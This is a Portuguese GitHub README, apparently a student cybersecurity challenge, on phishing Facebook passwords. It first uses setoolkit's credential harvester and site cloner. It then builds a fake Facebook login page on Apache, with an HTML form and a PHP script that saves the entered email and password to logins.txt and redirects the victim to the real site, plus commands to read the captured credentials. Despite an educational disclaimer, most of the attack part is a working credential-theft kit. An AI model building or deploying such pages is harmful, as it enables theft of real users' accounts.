# cibersecurity-desafio-phishing
Phishing para captura de senhas do Facebook

Ferramentas

Kali Linux

setoolkit

Configurando o Phishing no Kali Linux

Acesso root: sudo su

Iniciando o setoolkit: 

Tipo de ataque: Social-Engineering Attacks

Vetor de ataque: Web Site Attack Vectors

Método de ataque: Credential Harvester Attack Method 

Método de ataque: Site Cloner

Obtendo o endereço da máquina: ifconfig

URL para clone: http://www.facebook.com


![Captura de tela 2025-06-11 091900](https://github.com/user-attachments/assets/5e1a7afe-ff99-41b7-94c6-5abbae6526c0)
ss

sobre a imagem acima

Nesse  caso, não aparece diretamente um "username" ou "password" legível. Isso pode acontecer quando:

O site clonado não usa formulários padrão (como o Facebook, que usa JavaScript avançado e AJAX).

Os dados são enviados em partes criptografadas ou com tokens.

por isso ocorreu o erro.

eu consegui fazer mais de outra forma fazendo uma pagina fake do facebook

#  Página Falsa do Facebook para Captura Simulada de Login

⚠️ **ATENÇÃO**: Este projeto é estritamente para fins educacionais e deve ser utilizado apenas em ambientes controlados e com autorização. **Não utilize este código para fins ilegais ou maliciosos.**

---

## 🎯 Objetivo

Simular uma página de login com aparência semelhante ao Facebook, capturar os dados digitados (e-mail e senha), armazená-los localmente e redirecionar o usuário para o site verdadeiro do Facebook. Projeto voltado para fins de estudo em **cibersegurança e engenharia social**.

---

## 🧰 Tecnologias e Ferramentas Usadas

- Kali Linux (VirtualBox)
- 
- Apache2
- 
- HTML + CSS
- 
- PHP
- 
- Bash (comandos de terminal)

---

## 🛠️ Etapas do Projeto

### 1. Instalação e execução do Apache

```bash
sudo apt update

sudo apt install apache2

sudo systemctl start apache2

sudo systemctl enable apache2

### 2. Verificar se o Apache está rodando

sudo systemctl status apache2

Você deve ver algo como:

Active: active (running)

### 3. Descobrir o IP local da máquina

ip a

Procure uma linha como:

inet 192.168.1.5/24

Esse será o IP para acessar a página falsa:

192.168.1.5

🧩 Arquivos do Projeto

index.html
Página de login falsa com visual semelhante ao Facebook.

<form method="POST" action="process_login.php">
  <input type="text" name="email" placeholder="Email ou telefone" required />
  <input type="password" name="password" placeholder="Senha" required />
  <button type="submit">Entrar</button>
</form>

Salve como:

sudo nano /var/www/html/index.html

process_login.php
Script que recebe os dados do formulário, salva no arquivo logins.txt e redireciona para o Facebook verdadeiro.

<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    file_put_contents("logins.txt", "Email: $email | Senha: $password\n", FILE_APPEND);
    header("Location: https://www.facebook.com");
    exit();
} else {
    echo "Método inválido.";
}
?>

Salve como:

sudo nano /var/www/html/process_login.php

logins.txt
Arquivo onde os dados capturados serão armazenados.

sudo touch /var/www/html/logins.txt
sudo chmod 666 /var/www/html/logins.txt


✅ Teste Final
Acesse: http://192.168.1.5

Preencha e envie o formulário

Verifique se você foi redirecionado para o site real

Veja os dados capturados:

cat /var/www/html/logins.txt

 
![Capela 2025-06-1tura de t1 113635.png](https://github.com/user-attachments/assets/5e1a7afe-ff99-41b7-94c6-5abbae6526c0).
ss
